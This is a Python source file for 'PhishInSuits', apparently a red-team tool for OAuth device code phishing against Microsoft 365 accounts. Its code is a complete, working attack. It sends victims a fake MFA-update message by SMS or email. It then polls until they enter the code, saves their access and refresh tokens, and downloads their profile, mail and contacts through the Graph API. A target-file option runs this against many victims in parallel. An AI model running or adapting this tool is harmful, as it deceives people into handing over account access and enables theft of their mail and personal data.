#!/usr/bin/env python3

# Copyright 2021 Secureworks
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import sys
import time
import json
import urllib
import urllib3
import os.path
import logging
import argparse
import requests
import datetime
import concurrent.futures
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

__version__ = '1.0.0'


class User(object):
    """ User object for device code flow

    :param <str> email: (Required)
        Email address of the target victim
    :param <str> phone: (Optional)
        Phone number of the target victim
    """
    def __init__(self, email, phone=None):
        self.email = email  # Required
        self.phone = phone  # Optional
        # Storage for device code flow responses
        self.devicecode    = None
        self.tokenResponse = None
        # HTTP/S headers to emulate valid browser requests
        # Using a generic User-Agent as RFC 8628 states that device code
        # authorization can occur anywhere that that input is constrained
        # making the user having to input the user code text impractical.
        self.headers = {
            "DNT":                        "1",
            "Accept":                     "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Connection":                 "keep-alive",
            "User-Agent":                 "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36",
            "Accept-Encoding":            "gzip, deflate",
            "Accept-Language":            "en-US,en;q=0.5",
            "Upgrade-Insecure-Requests":  "1"
        }


def device_code_auth(user, proxies, args):
    """ Perform device code authorization & authentication

    :param <User> user:           (Required)
        User object for use in current thread
    :param <dict> proxies:        (Required)
        HTTP/S Proxy
    :param <ArgumentParser> args: (Required)
        Command line arguments
    """

    """ Step 1: Perform device authorization

    Collect the device and user code used to initiate authentication from the
    Microsoft endpoint.
    """
    # Update the Content-Type for the device code flow
    user.headers['Content-Type'] = 'application/x-www-form-urlencoded'

    # Generate scope based on user input
    # Initially handle comma delimited lists for easier command line handling
    scope = args.scope or 'user.read,offline_access,openid,profile,email,Mail.Read,Contacts.Read'
    scope = ' '.join(scope.split(','))

    logging.info(f'[{user.email}] Requesting scope: {scope}')

    url    = "https://login.microsoftonline.com/organizations/oauth2/v2.0/devicecode"
    params = (
        ('client_id' , args.client_id),
        ('scope'     , scope)
    )
    data = urllib.parse.urlencode(params)

    # Grab the authorized device code response
    resp = requests.post(url, headers=user.headers, data=data, proxies=proxies, verify=False)

    # Handle bad response
    if resp.status_code != 200:
        logging.error(f'[{user.email}] Invalid response from /devicecode:\n{resp.json()}')
        return False

    user.devicecode = resp.json()

    logging.debug(f'[{user.email}] Device code auth response:\n{user.devicecode}')
    logging.info(f'[{user.email}] Code successfully retrieved.')
    logging.info(f'[{user.email}] Message: {user.devicecode["message"]}')

    """ Step 2: Send device authentication to the target user via SMS/Email

    Send the activation code and Microsoft endpoint to the user for app
    authentication.
    """
    # Set the pretext message
    # Note: This message is specific to a pretext about MFA updates
    message = f'Please use the following Microsoft URL to update your phone to Microsoft MFA. {user.devicecode["message"]}'

    twil_lib = False  # Default

    # Validate we have all the information required to perform a text message campaign
    if args.from_phone and user.phone and args.twl_sid and args.twl_token:
        try:
            # Attempt to import the Twilio lib
            from twilio.rest import Client
            # Enable SMS
            twil_lib = True
        except:
            # If the import fails - notify the user we are falling back
            logging.info(f"[{user.email}] Twilio library not installed - falling back to email pretext.")
            pass

    if twil_lib:
        # Send text message to target with devicecode message
        logging.info(f"[{user.email}] Texting victim: {message}.")
        client  = Client(args.twl_sid, args.twl_token)
        client.messages.create(to=user.phone, from_=args.from_phone, body=message)
        logging.info(f"[{user.email}] Text message successfully sent.")
    else:
        # Send email to target with devicecode message
        # For the time being, the tool will output a notification to the user to send
        # an email to the victim containing the pretext message.
        logging.info(f"[{user.email}][TODO] Send target '{user.email}' the phishing message via email:\n\t{message}")

    """ Step 3: Validate user authentication

    Poll the token endpoint to check for user authentication - once authenticated,
    collect the authentication and refresh tokens.
    """
    url    = "https://login.microsoftonline.com/organizations/oauth2/v2.0/token"
    params = (
        ('grant_type' , 'urn:ietf:params:oauth:grant-type:device_code'),
        ('code'       , user.devicecode["device_code"]),
        ('client_id'  , args.client_id)
    )
    data = urllib.parse.urlencode(params)

    # Poll for user authentication
    expires_in = int(user.devicecode['expires_in']) / 60
    end_delta  = datetime.timedelta(minutes=expires_in)
    stop_time  = datetime.datetime.now() + end_delta

    while True:
        logging.info(f"[{user.email}] Polling for user authentication...")
        resp = requests.post(url, headers=user.headers, data=data, proxies=proxies, verify=False)
        # Handle debugging
        logging.debug(f'[{user.email}] Device code polling response:\n{resp.json()}')
        # Handle successful auth
        if resp.status_code == 200:
            break
        # Handle bad response
        if resp.json()['error'] != "authorization_pending":
            logging.error(f'[{user.email}] Invalid response from /token:\n{resp.json()}')
            return False
        # Handle device code expiration/timeout
        if datetime.datetime.now() >= stop_time:
            logging.error(f'Device code expired.')
            return False
        time.sleep(int(user.devicecode['interval']))

    # Set response once polling proves true
    user.tokenResponse = resp.json()

    with open(f'{user.email}.tokeninfo.json', 'w') as f:
        json.dump(user.tokenResponse, f)

    logging.info(f"[{user.email}] Token info saved to {user.email}.tokeninfo.json")

    return True


def get_user_data(user, proxies, api):
    """ Step 4: Collect user data

    Once the device code flow has provided an authentication token, use the
    Azure Graph API to download data.

    :param <User> user:    (Required)
        User object for use in current thread
    :param <dict> proxies: (Required)
        HTTP/S Proxy
    :param <str> api:      (Required)
        Comma delimited string of API calls to make
    """
    # Update the Content-Type for accessing the Azure Graph API
    user.headers['Content-Type'] = 'application/json'

    # Add user access token to the headers
    bearer_token = f'Bearer {user.tokenResponse["access_token"]}'
    user.headers['Authorization'] = bearer_token

    # Parse the API calls requested by the user
    api = api or ''  # If NoneType, make empty string
    api_calls = api.split(',')

    # Add empty string to collect user profile first
    if '' not in api_calls:
        api_calls.insert(0, '')

    for call in api_calls:
        call = call.lstrip('/')
        url  = f'https://graph.microsoft.com/v1.0/users/{user.email}/{call}'

        resp = requests.get(url, headers=user.headers, proxies=proxies, verify=False)

        # Handle bad response
        if resp.status_code != 200:
            logging.error(f'[{user.email}] Invalid Graph API response:\n{resp.json()}')
            return False

        logging.debug(f'[{user.email}] Graph API response:\n{resp.json()}')

        call = call.replace('/', '_') or 'profile'
        with open(f'{user.email}.{call}.json', 'w') as f:
            json.dump(resp.json(), f)

        logging.info(f"[{user.email}] Azure Graph API results for '{call}' saved to {user.email}.{call}.json")


def run(user, proxies, args):
    """ Execute the device auth flow

    :param <User> user:           (Required)
        User object for use in current thread
    :param <dict> proxies:        (Required)
        HTTP/S Proxy
    :param <ArgumentParser> args: (Required)
        Command line arguments
    """
    if device_code_auth(user, proxies, args):
        if args.get_data:
            return get_user_data(user, proxies, args.api)


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description=f"PhishInSuits: OAuth Device Code Phishing with Verified Apps - v{__version__}",
                                     formatter_class=argparse.RawTextHelpFormatter)
    # User specific handling
    parser.add_argument('-e', '--tgt_email',  type=str, help='Target victim email address')
    parser.add_argument('-p', '--tgt_phone',  type=str, help='Target victim phone number (Optional)')
    parser.add_argument('-f', '--tgt_file',   type=str, help='File containing target email addresses and phone numbers (Optional).\n' +
                                                             'One target per line.\n' +
                                                             'Comma delimited -> email,phone')
    # Global handling
    parser.add_argument('-P', '--from_phone', type=str, help='Phone number to send texts from via Twilio')
    parser.add_argument('-s', '--twl_sid',    type=str, help='Twilio SID')
    parser.add_argument('-k', '--twl_token',  type=str, help='Twilio Token')
    parser.add_argument('-c', '--client_id',  type=str, help='Client ID for the target application')
    # Application scope handling
    parser.add_argument('-S', '--scope',      type=str, help='Comma delimited list of permissions to request.\n' +
                                                             'Default: user.read offline_access openid profile email Mail.Read Contacts.Read')
    # Azure Graph API handling
    parser.add_argument('-G', '--get-data',   action='store_true', help='After authentication, collect data from Azure Graph API')
    parser.add_argument('-A', '--api',        type=str, help='List of API endpoints to call.\n' +
                                                             'User profile will always be included.\n' +
                                                             'Comma delimited list')
    # Support flags
    parser.add_argument('--proxy',   type=str, help='Proxy to pass traffic through (e.g. http://127.0.0.1:8080)')
    parser.add_argument('--threads', type=int, help='Number of threads for multi-target runs (Default=20)', default=20)
    parser.add_argument('--debug',   action='store_true', help='Enable debugging output')
    args = parser.parse_args()

    # Initialize logging level and format
    logging_format = '[%(levelname)s] %(message)s'
    logging_level  = logging.DEBUG if args.debug else logging.INFO
    logging.basicConfig(format=logging_format, level=logging_level)

    # Disable Twilio logging except when debugging
    twilio_logger = logging.getLogger('twilio.http_client')
    twilio_logger.setLevel(logging.DEBUG if args.debug else logging.WARNING)

    # Establish HTTP/S request proxies if provided by the user
    proxies = None if not args.proxy else {
        'http': args.proxy, 'https': args.proxy
    }

    # Handle multiple victims via a target file
    if args.tgt_file:
        # Validate the file exists
        if not os.path.isfile(args.tgt_file):
            logging.error(f"{args.tgt_file} does not exist!")
            sys.exit(1)

        # Multi-threaded handling so we can poll multiple users at once
        with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as executor:
            futures = []
            with open(args.tgt_file, 'r') as in_file:
                # Iterate over each user, adding a future to our executor pool
                for line in in_file.readlines():
                    line = line.strip().split(',')
                    user = User(line[0], line[1] or None)
                    futures.append(executor.submit(run, user=user, proxies=proxies, args=args))

            # Execute the executor pool
            concurrent.futures.as_completed(futures)

    # Handle a single target
    else:
        if not args.tgt_email:
            parser.error('Target email address [-e|--tgt_email] is missing.')

        # Trigger a single run
        user = User(args.tgt_email, args.tgt_phone)
        run(user, proxies, args)
